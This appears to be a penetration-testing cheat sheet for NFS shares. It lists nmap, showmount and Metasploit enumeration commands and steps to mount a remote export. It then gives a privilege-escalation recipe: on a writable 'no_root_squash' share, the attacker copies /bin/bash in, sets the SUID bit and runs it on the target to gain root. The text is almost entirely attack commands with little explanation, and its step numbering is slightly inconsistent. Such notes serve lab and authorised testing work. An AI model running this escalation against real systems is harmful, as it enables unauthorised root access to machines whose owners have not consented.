## Enumeration

    nmap --script nfs-ls,nfs-showmount,nfs-statfs <IP>
    showmount -e <IP>

##### Metasploit

    use auxiliary/scanner/nfs/nfsmount

### 1) Create a directory on the attacking machine

    sudo mkdir /mount/

### 2) Mount to the directory just created

    sudo mount -t nfs <IP>:<PATH> /mount/ -o nolock

    ls -la /mount/

### 3) Confirm mount

    mount <PATH>

# Example:

## 

    cat /etc/exports

# Critical element: "no_root_squash" on a writable share (SUID bit set file create) or fsid=0/fsid=root

### 1: Check the name of the folder

    showmount -e IP

### 2: Create directory

    mkdir /tmp/backups

### 3: Mount directory

    mount -o rw IP:/writable_share /tmp/backups

### 4: Copy wanted shell

    cp /bin/bash .

### 6: Give SUID bit

    chmod +s bash

### 7: Execute from target machine

    ./bash
